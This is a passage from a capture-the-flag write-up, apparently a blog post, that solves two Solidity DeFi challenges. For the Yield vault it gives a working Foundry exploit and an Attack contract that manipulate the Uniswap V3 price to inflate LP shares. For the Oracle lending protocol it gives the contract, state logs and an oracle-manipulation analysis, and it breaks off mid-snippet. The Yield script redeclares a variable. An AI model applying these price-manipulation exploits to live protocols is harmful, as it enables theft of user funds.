</span></code></pre></div></div><h2 id=solution-3><a aria-label="Anchor link for: solution-3" class=zola-anchor href=#solution-3>Solution</a></h2><p>Uniswap V3 is scary for sure but to break things you don't need to master it. This is an example challege of how you can do yeild farming in Uniswap V3.<p>Let's break down the key components and observations of this Yield contract:<ol><li><p><strong>Core Functionality</strong>:</p> <ul><li>Implements a yield farming vault for Uniswap V3<li>Manages liquidity positions in a specific price range<li>Allows users to deposit and withdraw tokens<li>Collects and distributes fees from the pool</ul><li><p><strong>Key State Variables</strong>:</p> <ul><li><code>baseLower</code> and <code>baseUpper</code>: Defines the price range for liquidity provision<li><code>lastTick</code>: Tracks the last price tick for rebalancing<li><code>protocolFee</code>: Fee charged by the protocol (in basis points)<li><code>maxTotalSupply</code>: Maximum allowed LP tokens<li><code>accruedProtocolFees</code>: Tracks fees collected by the protocol</ul><li><p><strong>Important Functions</strong>:</p> <ul><li><code>deposit()</code>: Allows users to add liquidity and receive LP tokens<li><code>withdraw()</code>: Lets users withdraw their share of liquidity<li><code>rebalance()</code>: Adjusts the liquidity position based on price changes<li><code>_poke()</code>: Updates the vault's holdings<li><code>_calcSharesAndAmounts()</code>: Calculates LP tokens based on deposits</ul></ol><p><strong>Goal Understanding</strong>:<ul><li>We need to get 15e18 LP tokens<li>We're given 5e18 each of token0 and token1</ul><p>I suspected the following things in the protocol as the potential issues to exploit,<ul><li>The <code>rebalance()</code> function has a price movement requirement (<code>diff >= 5 * tickSpacing</code>)<li>The <code>_calcSharesAndAmounts()</code> function has a potential rounding issue<li>The <code>deposit()</code> function's share calculation might be manipulated<li>The compiler version is <code>solidity ^0.7.0</code>, i.e, suceptible to integer overflows</ul><ol><li><p><strong>Price Manipulation</strong>:</p> <ul><li>The Yield contract uses the pool's price to calculate LP token shares<li>We can manipulate the pool's price by performing large swaps<li>When we swap token0 for token1, we push the price to the minimum (MIN_SQRT_RATIO)<li>When we swap token1 for token0, we push the price to the maximum (MAX_SQRT_RATIO)</ul><li><p><strong>Share Calculation Exploit</strong>:</p> <ul><li>The <code>_calcSharesAndAmounts()</code> function calculates shares based on the current pool price<li>When the price is manipulated to extreme values, the share calculation becomes inaccurate<li>This allows us to get more LP tokens than we should for our deposit</ul></ol><div class=note-container><button class=note-toggle><div class=note-icon><p>Yield.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: Unlicense
</span><span>pragma solidity ^0.7.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
</span><span>import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/IERC20.sol";
</span><span>import {Yield } from "../src/Yield.sol";
</span><span>contract YieldSolve is Script {
</span><span>    Yield public yield = Yield(0x59CD84565A441D6551ecb87F7878F4b028AD8e8B);
</span><span>    IUniswapV3Pool public pool = yield.pool();
</span><span>    IERC20 public token0 = IERC20(pool.token0());
</span><span>    IERC20 public token1 = IERC20(pool.token1());
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Player : ", player);
</span><span>        console.log("Player balance: ", player.balance);
</span><span>        console.log("Yield : ", address(yield));
</span><span>        console.log("Pool : ", address(pool));
</span><span>        // console.log("token0 : ", address(token0));
</span><span>        // console.log("token1 : ", address(token1));
</span><span>        console.log("Pool balance of token0 : ", token0.balanceOf(address(pool)));
</span><span>        console.log("Pool balance of token1 : ", token1.balanceOf(address(pool)));
</span><span>
</span><span>        (uint160 sqrtPriceX96,int24 tick,,,,,) = pool.slot0();
</span><span>        console.log("Pool tick : ", tick);
</span><span>        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
</span><span>        // console.log("Token0 price in terms of Token1 : ", 1.0001**tick);
</span><span>        // console.log("baseLower: ", yield.baseLower());
</span><span>        // console.log("baseUpper: ", yield.baseUpper());
</span><span>        // console.log("tickSpacing: ", yield.tickSpacing());
</span><span>
</span><span>        (uint256 total0, uint256 total1) = yield.getTotalAmounts();
</span><span>        console.log("total0: ", total0);
</span><span>        console.log("total1: ", total1);
</span><span>        console.log("Yield balance of token0 : ", token0.balanceOf(address(yield)));
</span><span>        console.log("Yield balance of token1 : ", token1.balanceOf(address(yield)));
</span><span>        console.log("Yield getBalance0() : ", yield.getBalance0());
</span><span>        console.log("Yield getBalance1() : ", yield.getBalance1());
</span><span>        console.log("Initial LP tokens : ", yield.totalSupply());
</span><span>        console.log("Yield accruedProtocolFees0() : ", yield.accruedProtocolFees0());
</span><span>        console.log("Yield accruedProtocolFees1() : ", yield.accruedProtocolFees1());
</span><span>
</span><span>
</span><span>        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
</span><span>        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
</span><span>        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));
</span><span>
</span><span>        token0.approve(address(yield),  14 ether);
</span><span>        token1.approve(address(yield), 15 ether);
</span><span>        yield.deposit( 14 ether, 15 ether, 1, 1, player);
</span><span>        // Repeat the following process until we got more LP tokens
</span><span>        Attack attack = new Attack(address(yield), player);
</span><span>        Attack attack = Attack(0xf5420a93FCa0E520E319Dc3f05625c79613be6b0);
</span><span>        token0.transfer(address(attack), 2 ether);
</span><span>        token1.transfer(address(attack), 2 ether);
</span><span>        attack.exploit(true); 
</span><span>        yield.withdraw(yield.balanceOf(player), 0, 0, player);
</span><span>
</span><span>        
</span><span>        (sqrtPriceX96,tick,,,,,) = pool.slot0();
</span><span>        console.log("Pool tick : ", tick);
</span><span>        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
</span><span>        (total0, total1) = yield.getTotalAmounts();
</span><span>        console.log("total0: ", total0);
</span><span>        console.log("total1: ", total1);
</span><span>        console.log("Yield getBalance0() : ", yield.getBalance0());
</span><span>        console.log("Yield getBalance1() : ", yield.getBalance1());
</span><span>        console.log("Initial LP tokens : ", yield.totalSupply());
</span><span>
</span><span>        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
</span><span>        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
</span><span>        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));
</span><span>
</span><span>        // console.log("isSolved() : ", yield.isSolved());
</span><span>        vm.stopBroadcast();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack {
</span><span>    Yield public yield;
</span><span>    IUniswapV3Pool public pool;
</span><span>    IERC20 public token0;
</span><span>    IERC20 public token1;
</span><span>    address public player;
</span><span>    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
</span><span>    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;
</span><span>
</span><span>    constructor(address _yeild, address _player){
</span><span>        yield = Yield(_yeild);
</span><span>        pool = yield.pool();
</span><span>        token0 = IERC20(pool.token0());
</span><span>        token1 = IERC20(pool.token1());
</span><span>        player = _player;
</span><span>    }
</span><span>    function exploit(bool zeroForOne) public {
</span><span>        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
</span><span>        if (zeroForOne){
</span><span>            uint256 token0bal =  token0.balanceOf(address(this));
</span><span>            token0.approve(address(pool), token0bal);
</span><span>            pool.swap(player, true, int256(token0bal), MIN_SQRT_RATIO+1, "");
</span><span>        }
</span><span>        else {
</span><span>            uint256 token1bal =  token1.balanceOf(address(this));
</span><span>            token1.approve(address(pool), token1bal);
</span><span>            pool.swap(player, false, int256(token1bal), MAX_SQRT_RATIO-1, "");
</span><span>        }
</span><span>        
</span><span>        token0.transfer(player, token0.balanceOf(address(this)));
</span><span>        token1.transfer(player, token1.balanceOf(address(this)));
</span><span>
</span><span>    }
</span><span>    function uniswapV3SwapCallback(
</span><span>        int256 amount0Delta,
</span><span>        int256 amount1Delta,
</span><span>        bytes calldata data
</span><span>    ) external  {
</span><span>        require(msg.sender == address(pool));
</span><span>        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
</span><span>        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
</span><span>    }
</span><span>}
</span></code></pre></div></div><p>The exploit takes advantage of the fact that the Yield contract doesn't properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.<hr><h1 id=oracle><a aria-label="Anchor link for: oracle" class=zola-anchor href=#oracle>Oracle</a></h1><p>P: "Michael wrote a Dex pool for USDe and USDC tokens along with their respective oracles. Then he borrowed a large position from his own pool trusting his own code. The pool is deployed with the same code and params as the actual pool at https://etherscan.io/tx/0x6f4438aa1785589e2170599053a0cdc740d8987746a4b5ad9614b6ab7bb4e550. You are given 10000 tokens of USDe and USDC. Your goal is to get 20000 of USDe.<p>Might help you: check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"<div class=note-container><button class=note-toggle><div class=note-icon><p>Oracle.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/IERC20.sol";
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/security/ReentrancyGuard.sol";
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/access/Ownable.sol";
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/utils/math/Math.sol";
</span><span>
</span><span>interface ICurve {
</span><span>    function add_liquidity(
</span><span>        uint256[] calldata amounts,
</span><span>        uint256 min_mint_amount
</span><span>    ) external returns (uint256);
</span><span>
</span><span>    function remove_liquidity_imbalance(
</span><span>        uint256[] calldata amounts,
</span><span>        uint256 max_burn_amount
</span><span>    ) external returns (uint256);
</span><span>
</span><span>    function price_oracle(uint256 idx) external view returns (uint256);
</span><span>    function last_price(uint256 idx) external view returns (uint256);
</span><span>    function coins(uint256 idx) external view returns (address);
</span><span>    function balanceOf(address owner) external view returns (uint256);
</span><span>    // function lp_token() external view returns (address);
</span><span>    function approve(address spender, uint256 amount) external returns (bool);
</span><span>
</span><span>    function exchange(
</span><span>        int128 i,
</span><span>        int128 j,
</span><span>        uint256 dx,
</span><span>        uint256 min_dy
</span><span>    ) external returns (uint256);
</span><span>}
</span><span>
</span><span>interface IPriceOracle {
</span><span>    function getAssetPrice(uint256 _assetId) external view returns (uint256);
</span><span>}
</span><span>
</span><span>contract SimplePriceOracle is IPriceOracle, Ownable {
</span><span>    uint256 public price;
</span><span>
</span><span>    constructor(uint256 _price) Ownable() {
</span><span>        price = _price;
</span><span>    }
</span><span>
</span><span>    function setPrice(uint256 _price) external onlyOwner {
</span><span>        price = _price;
</span><span>    }
</span><span>
</span><span>    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
</span><span>        return price;
</span><span>    }
</span><span>}
</span><span>
</span><span>contract CurvePriceOracle is IPriceOracle {
</span><span>    address public curvePool;
</span><span>    uint256 public idx;
</span><span>
</span><span>    constructor(address _curvePool, uint256 _idx, uint256 anchor) {
</span><span>        curvePool = _curvePool;
</span><span>
</span><span>        uint256 absDiff = 0;
</span><span>        if (ICurve(curvePool).price_oracle(_idx) > anchor) {
</span><span>            absDiff = ICurve(curvePool).price_oracle(_idx) - anchor;
</span><span>        } else {
</span><span>            absDiff = anchor - ICurve(curvePool).price_oracle(_idx);
</span><span>        }
</span><span>        require(absDiff <= 1e8, "Price oracle has been manipulated :(");
</span><span>    }
</span><span>
</span><span>    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
</span><span>        return ICurve(curvePool).price_oracle(idx);
</span><span>    }
</span><span>
</span><span>    function getSpotPrice() external view returns (uint256) {
</span><span>        return ICurve(curvePool).last_price(idx);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Oracle is ReentrancyGuard, Ownable {
</span><span>    struct Asset {
</span><span>        IERC20 token;
</span><span>        uint256 totalDeposited;
</span><span>        uint256 totalBorrowed;
</span><span>        uint256 baseRate;
</span><span>    }
</span><span>
</span><span>    struct UserAccount {
</span><span>        mapping(uint256 => uint256) deposited;
</span><span>        mapping(uint256 => uint256) borrowed;
</span><span>        mapping(uint256 => uint256) lastInterestBlock;
</span><span>    }
</span><span>
</span><span>    mapping(address => UserAccount) userAccounts;
</span><span>    mapping(uint256 => Asset) public assets;
</span><span>    uint256 public assetCount;
</span><span>    address public player;
</span><span>
</span><span>    uint256 public constant LIQUIDATION_CLOSE_FACTOR = 100; // 100% of the borrow can be liquidated
</span><span>    uint256 public constant PRECISION = 1e18;
</span><span>    uint256 public constant MAX_LOOPS = 10;
</span><span>    uint256 public constant BAD_DEBT_RATIO = 110;
</span><span>    uint256 public constant MIN_HEALTH_FACTOR = 1.05e18;
</span><span>
</span><span>    mapping(uint256 => address) public priceOracles;
</span><span>
</span><span>    event AssetAdded(uint256 indexed assetId, address indexed token);
</span><span>    event Deposit(address indexed user, uint256 indexed assetId, uint256 amount);
</span><span>    event Withdraw(address indexed user, uint256 indexed assetId, uint256 amount);
</span><span>    event Borrow(address indexed user, uint256 indexed assetId, uint256 amount);
</span><span>    event Repay(address indexed user, uint256 indexed assetId, uint256 amount);
</span><span>    event Liquidate(
</span><span>        address indexed liquidator,
</span><span>        address indexed borrower,
</span><span>        uint256 indexed assetId,
</span><span>        uint256 amount,
</span><span>        uint256 collateralAssetId,
</span><span>        uint256 collateralAmount
</span><span>    );
</span><span>
</span><span>    constructor(address _player) Ownable() {
</span><span>        player = _player;
</span><span>    }
</span><span>
</span><span>    function isSolved() external view returns (bool) {
</span><span>        return assets[0].token.balanceOf(address(player)) >= 20000 ether;
</span><span>    }
</span><span>
</span><span>    function getUserAccount(address user, uint256 depositAssetId, uint256 borrowAssetId, uint256 interestAssetId) external view returns (uint256, uint256, uint256) {
</span><span>        UserAccount storage account = userAccounts[user];
</span><span>        return (account.deposited[depositAssetId], account.borrowed[borrowAssetId], account.lastInterestBlock[interestAssetId]);
</span><span>    }
</span><span>
</span><span>    function addAsset(
</span><span>        address _token,
</span><span>        uint256 _baseRate
</span><span>    ) external onlyOwner {
</span><span>        assets[assetCount] = Asset({
</span><span>            token: IERC20(_token),
</span><span>            totalDeposited: 0,
</span><span>            totalBorrowed: 0,
</span><span>            baseRate: _baseRate
</span><span>        });
</span><span>        emit AssetAdded(assetCount, _token);
</span><span>        assetCount++;
</span><span>    }
</span><span>
</span><span>    function setPriceOracle(uint256 _assetId, address _priceOracle) external onlyOwner {
</span><span>        priceOracles[_assetId] = _priceOracle;
</span><span>    }
</span><span>
</span><span>    function deposit(uint256 _assetId, uint256 _amount) external nonReentrant {
</span><span>        require(_assetId < assetCount, "Invalid asset");
</span><span>        require(_amount > 0, "Amount must be greater than 0");
</span><span>
</span><span>        Asset storage asset = assets[_assetId];
</span><span>        require(asset.token.transferFrom(msg.sender, address(this), _amount), "Transfer failed");
</span><span>
</span><span>        updateInterest(msg.sender, _assetId);
</span><span>        userAccounts[msg.sender].deposited[_assetId] += _amount;
</span><span>        asset.totalDeposited += _amount;
</span><span>
</span><span>        emit Deposit(msg.sender, _assetId, _amount);
</span><span>    }
</span><span>
</span><span>    function borrow(uint256 _assetId, uint256 _amount) external nonReentrant {
</span><span>        require(_assetId < assetCount, "Invalid asset");
</span><span>        require(_amount > 0, "Amount must be greater than 0");
</span><span>
</span><span>        updateInterest(msg.sender, _assetId);
</span><span>
</span><span>        UserAccount storage account = userAccounts[msg.sender];
</span><span>        Asset storage asset = assets[_assetId];
</span><span>
</span><span>        uint256 newBorrowAmount = account.borrowed[_assetId] + _amount;
</span><span>        account.borrowed[_assetId] = newBorrowAmount;
</span><span>        asset.totalBorrowed += _amount;
</span><span>
</span><span>        uint256 healthFactor = calculateHealthFactor(msg.sender);
</span><span>        require(healthFactor >= MIN_HEALTH_FACTOR, "Borrow would result in undercollateralization");
</span><span>
</span><span>        require(asset.token.transfer(msg.sender, _amount), "Transfer failed");
</span><span>
</span><span>        emit Borrow(msg.sender, _assetId, _amount);
</span><span>    }
</span><span>
</span><span>    function liquidate(address _borrower, uint256 _assetId, uint256 _amount, uint256 _collateralAssetId)
</span><span>        external
</span><span>        nonReentrant
</span><span>    {
</span><span>        require(_assetId < assetCount && _collateralAssetId < assetCount, "Invalid asset");
</span><span>        require(_amount > 0, "Amount must be greater than 0");
</span><span>        require(_borrower != msg.sender, "Cannot liquidate own position");
</span><span>        require(_assetId != _collateralAssetId, "Cannot liquidate same asset");
</span><span>
</span><span>        updateInterest(_borrower, _assetId);
</span><span>        updateInterest(_borrower, _collateralAssetId);
</span><span>
</span><span>        UserAccount storage borrowerAccount = userAccounts[_borrower];
</span><span>        Asset storage borrowedAsset = assets[_assetId];
</span><span>        Asset storage collateralAsset = assets[_collateralAssetId];
</span><span>
</span><span>        uint256 healthFactor = calculateHealthFactor(_borrower);
</span><span>        require(healthFactor < PRECISION, "Account not liquidatable");
</span><span>
</span><span>        uint256 maxLiquidatable = borrowerAccount.borrowed[_assetId] * LIQUIDATION_CLOSE_FACTOR / 100;
</span><span>        uint256 actualLiquidation = Math.min(_amount, maxLiquidatable);
</span><span>
</span><span>        uint256 realCollateralAmount = actualLiquidation * getAssetPrice(_assetId) / getAssetPrice(_collateralAssetId);
</span><span>        uint256 collateralAmount = Math.min(realCollateralAmount, borrowerAccount.deposited[_collateralAssetId]);
</span><span>
</span><span>        uint256 toLiquidate = collateralAmount * getAssetPrice(_collateralAssetId) / getAssetPrice(_assetId);
</span><span>        if (realCollateralAmount > borrowerAccount.deposited[_collateralAssetId]) {
</span><span>            toLiquidate = toLiquidate * BAD_DEBT_RATIO / 100;
</span><span>        }
</span><span>
</span><span>        require(borrowedAsset.token.transferFrom(msg.sender, address(this), toLiquidate), "Transfer failed");
</span><span>        require(collateralAsset.token.transfer(msg.sender, collateralAmount), "Transfer failed");
</span><span>
</span><span>        borrowerAccount.borrowed[_assetId] -= actualLiquidation;
</span><span>        borrowerAccount.deposited[_collateralAssetId] -= collateralAmount;
</span><span>
</span><span>        borrowedAsset.totalBorrowed -= actualLiquidation;
</span><span>        collateralAsset.totalDeposited -= collateralAmount;
</span><span>
</span><span>        emit Liquidate(msg.sender, _borrower, _assetId, actualLiquidation, _collateralAssetId, collateralAmount);
</span><span>    }
</span><span>
</span><span>    function updateInterest(address _user, uint256 _assetId) internal {
</span><span>        UserAccount storage account = userAccounts[_user];
</span><span>        Asset storage asset = assets[_assetId];
</span><span>
</span><span>        if (account.lastInterestBlock[_assetId] == block.number) {
</span><span>            return;
</span><span>        }
</span><span>
</span><span>        uint256 interestRate = getInterestRate(_assetId);
</span><span>        uint256 blocksSinceLastUpdate = block.number - account.lastInterestBlock[_assetId];
</span><span>        uint256 interest =
</span><span>            account.borrowed[_assetId] * interestRate * blocksSinceLastUpdate / (365 days / 15) / PRECISION;
</span><span>        account.borrowed[_assetId] += interest;
</span><span>        asset.totalBorrowed += interest;
</span><span>        account.lastInterestBlock[_assetId] = block.number;
</span><span>    }
</span><span>
</span><span>    function getInterestRate(uint256 _assetId) public view returns (uint256) {
</span><span>        Asset storage asset = assets[_assetId];
</span><span>        return asset.baseRate;
</span><span>    }
</span><span>
</span><span>    function calculateHealthFactor(address _user) public view returns (uint256) {
</span><span>        uint256 totalCollateralInEth = 0;
</span><span>        uint256 totalBorrowedInEth = 0;
</span><span>
</span><span>        for (uint256 i = 0; i < assetCount; i++) {
</span><span>            Asset storage asset = assets[i];
</span><span>            UserAccount storage account = userAccounts[_user];
</span><span>
</span><span>            uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
</span><span>            uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);
</span><span>
</span><span>            totalCollateralInEth += collateralInEth;
</span><span>            totalBorrowedInEth += borrowedInEth;
</span><span>        }
</span><span>
</span><span>        if (totalBorrowedInEth == 0) {
</span><span>            return type(uint256).max;
</span><span>        }
</span><span>
</span><span>        return totalCollateralInEth * PRECISION / totalBorrowedInEth;
</span><span>    }
</span><span>
</span><span>    function getAssetPrice(uint256 _assetId) public view returns (uint256) {
</span><span>        if (priceOracles[_assetId] == address(0)) {
</span><span>            return 0;
</span><span>        }
</span><span>        return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-4><a aria-label="Anchor link for: solution-4" class=zola-anchor href=#solution-4>Solution</a></h2><p>An interesting chall, we got a Lending protocol which uses two different price oracles to get the asset price.<p>Lets, observe the protocol first,<ol><li><p><strong>Oracle (Main Contract)</strong></p> <ul><li>A lending protocol that allows users to deposit and borrow assets<li>Manages multiple assets with their respective price oracles<li>Handles liquidations and interest calculations<li>Uses two price oracles to determine asset values for collateralization</ul><li><p><strong>SimplePriceOracle</strong></p> <ul><li>A basic price oracle that returns a fixed price<li>Has an owner who can set the price</ul><li><p><strong>CurvePriceOracle</strong></p> <ul><li>More sophisticated oracle that gets prices from a Curve pool<li>Validates price against an anchor value<li>Can get both oracle price and spot price from the Curve pool</ul></ol><p>The challenge involves manipulating these contracts to get <code>20,000 USDe</code> tokens when starting with <code>10,000</code> each of USDe and USDC. As usual let me see the initial state of this protocol,<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span>  </span><span style=color:#f29718>Player</span><span> :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
</span><span>  </span><span style=color:#f29718>assetCount</span><span> :  2
</span><span>  </span><span style=color:#f29718>---------------Asset0----------------
</span><span>  </span><span style=color:#f29718>asset0</span><span> address:  0x21Bbb929210149d6a849caF486ee0263404056AD
</span><span>  </span><span style=color:#f29718>asset0</span><span> totalDeposited0 :  10000000000000000000000
</span><span>  </span><span style=color:#f29718>asset0</span><span> totalBorrowed0 :  0
</span><span>  </span><span style=color:#f29718>asset0</span><span> baseRate0 :  1
</span><span>  </span><span style=color:#f29718>asset0</span><span> priceOracle :  0xaabD0F52b2743ff3AF409f3f19f8626255961699
</span><span>  </span><span style=color:#f29718>-----------------Asset1--------------
</span><span>  </span><span style=color:#f29718>asset1</span><span> address:  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
</span><span>  </span><span style=color:#f29718>asset1</span><span> totalDeposited1 :  10000000000
</span><span>  </span><span style=color:#f29718>asset1</span><span> totalBorrowed1 :  18500000000
</span><span>  </span><span style=color:#f29718>asset1</span><span> baseRate1 :  1
</span><span>  </span><span style=color:#f29718>asset1</span><span> priceOracle :  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
</span><span>  </span><span style=color:#f29718>---------------Owner-----------------
</span><span>  </span><span style=color:#f29718>deposited0</span><span> :  10000000000000000000000
</span><span>  </span><span style=color:#f29718>borrowed0</span><span> :  0
</span><span>  </span><span style=color:#f29718>lastInterestedBlock0</span><span> :  3566869
</span><span>  </span><span style=color:#f29718>deposited1</span><span> :  10000000000
</span><span>  </span><span style=color:#f29718>borrowed1</span><span> :  18500000000
</span><span>  </span><span style=color:#f29718>lastInterestedBlock1</span><span> :  3566869
</span><span>  </span><span style=color:#f29718>asset0</span><span> balance :  0
</span><span>  </span><span style=color:#f29718>asset1</span><span> balance :  18500000000
</span><span>
</span><span>  </span><span style=color:#f29718>oracle</span><span> asset0 balance :  90000000000000000000000
</span><span>  </span><span style=color:#f29718>oracle</span><span> asset1 balance :  71500000000
</span><span>  </span><span style=color:#f29718>---------------Player-----------------
</span><span>  </span><span style=color:#f29718>deposited0</span><span> :  0
</span><span>  </span><span style=color:#f29718>borrowed0</span><span> :  0
</span><span>  </span><span style=color:#f29718>lastInterestedBlock0</span><span> :  0
</span><span>  </span><span style=color:#f29718>deposited1</span><span> :  0
</span><span>  </span><span style=color:#f29718>borrowed1</span><span> :  0
</span><span>  </span><span style=color:#f29718>lastInterestedBlock1</span><span> :  0
</span><span>  </span><span style=color:#f29718>asset0</span><span> balance :  10000000000000000000000
</span><span>  </span><span style=color:#f29718>asset1</span><span> balance :  10000000000
</span><span>  </span><span style=color:#f29718>-------------Price</span><span> Oracles---------------
</span><span>  </span><span style=color:#f29718>simplePriceOracle:</span><span>  0xaabD0F52b2743ff3AF409f3f19f8626255961699
</span><span>  </span><span style=color:#f29718>simplePriceOracle</span><span> asset0 Price :  1000000
</span><span>  </span><span style=color:#f29718>curvePriceOracle</span><span> (asset 1)</span><span style=color:#f07171>:</span><span>  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
</span><span>  </span><span style=color:#f29718>curvePriceOracle</span><span> Curve Pool :  0x46206ede2b79e862D91BFa0CB4ce21EDFa7fC96f
</span><span>  </span><span style=color:#f29718>Curve</span><span> asset1 Price :  1000000000000000000
</span><span>  </span><span style=color:#f29718>Curve</span><span> SpotPrice :  1000000000000000000
</span><span>  </span><span style=color:#f29718>-------------------------------------
</span><span>  </span><span style=color:#f29718>token</span><span> 0 in curve pool :  0x21Bbb929210149d6a849caF486ee0263404056AD
</span><span>  </span><span style=color:#f29718>token</span><span> 1 in curve pool :  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
</span></code></pre><p>Thats a lot of info but, I need at least this much to understood this protocol. So, looking at the initial state we can confirm that there are only two tokens in the lending Oracle contract and also the CurvePool oracle has also have the same tokens. As per the statement those two assets are <code>USDe</code> and <code>USDC</code> and we are given with <code>10000</code> amount of tokens each.<p>Can you guess? which one is the <code>USDe</code>? <code>asset0</code> or <code>asset1</code>?<blockquote><p>It's asset0, cause it has the decimals of 18. USDe is 18 decimals and USDC is 6.</blockquote><p>Owner has deposited <code>10000</code> of USDe, <code>10000</code> of USDC and borrowed <code>18500</code> of USDC.<p>What should we do?<ol><li>Can we directly <code>borrow()</code> <code>20000</code> USDe from the Oracle ? Yes If we have sufficient health factor.<li>Can we <code>liquidate()</code> owners collatoral and get all his collatoral asset ? Yes If can make owners health factor worse.</ol><p>Both of above options depends on the health factor, lets see how the health factor is calculated.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function calculateHealthFactor(address _user) public view returns (uint256) {
</span><span>    uint256 totalCollateralInEth = 0;
</span><span>    uint256 totalBorrowedInEth = 0;
</span><span>
</span><span>    for (uint256 i = 0; i < assetCount; i++) {
</span><span>        Asset storage asset = assets[i];
</span><span>        UserAccount storage account = userAccounts[_user];
</span><span>
</span><span>        uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
</span><span>        uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);
</span><span>
</span><span>        totalCollateralInEth += collateralInEth;
</span><span>        totalBorrowedInEth += borrowedInEth;
</span><span>    }
</span><span>
</span><span>    if (totalBorrowedInEth == 0) {
</span><span>        return type(uint256).max;
</span><span>    }
</span><span>
</span><span>    return totalCollateralInEth * PRECISION / totalBorrowedInEth;
</span><span>}
</span></code></pre><p>Health factor is being calculated based on the asset prices, Okay lets see how the asset price is fetched.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function getAssetPrice(uint256 _assetId) public view returns (uint256) {
</span><span>    if (priceOracles[_assetId] == address(0)) {
</span><span>        return 0;
</span><span>    }
</span><span>    return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
</span><span>}
</span></code></pre><p>Interesting, this is using different price oracles for each asset. <code>SimplePriceOracle</code> is used for asset0, and <code>CurvePoolOracle</code> is used for asset1. <code>SimplePriceOracle</code> always returns the same price meaning we can't manipulate this. But the <code>CurvePoolOracle</code> is fetching the price using <code>price_oracle</code> function of it.<p>We have the asset1(USDC), can we directly interact with <code>CurvePool</code> and do some deposit kind of thing these and change the price.??<p>Yes Bro, that's is what the challenge is and that's called <code>ORACLE MANIPULATION</code> too.<p>Let's see is that <code>CurvePool</code> is vulnerable to Oracle Manipulation or not?<blockquote><p>There was an hint in the statement, "check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"</blockquote><p>So, the <code>CurvePool</code> deployed at that time might have this kind of vulnerability. Following the traces of the transaction in given in the statement got me a <code>CurveStableSwapNG</code> <strong>Vyper</strong> contract.<blockquote><p>Now the grinding begins, I read all the documentation about this CurveStableSwapNG from here : <a href=https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity>CurveStableSwapNG Metapool Docs</a>.</blockquote><p>Let me the paste the snippet that is matter to us.<pre class=language-python data-lang=python style=color:#61676c;background-color:#fafafa><code class=language-python data-lang=python><span style=color:#61676ccc>@</span><span style=color:#f29718>external
</span><span style=color:#61676ccc>@</span><span style=color:#f29718>view
</span><span style=color:#61676ccc>@</span><span style=color:#f29718>nonreentrant</span><span>(</span><span style=color:#86b300>'lock'</span><span>)
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>price_oracle</span><span>(</span><span style=color:#ff8f40>i</span><span style=color:#61676ccc>: </span><span>uint256) </span><span style=color:#61676ccc>-> </span><span>uint256:
</span><span>    </span><span style=color:#fa6e32>return </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_calc_moving_average</span><span>(
</span><span>        </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span>last_prices_packed[i]</span><span style=color:#61676ccc>,
</span><span>        </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span>ma_exp_time</span><span style=color:#61676ccc>,
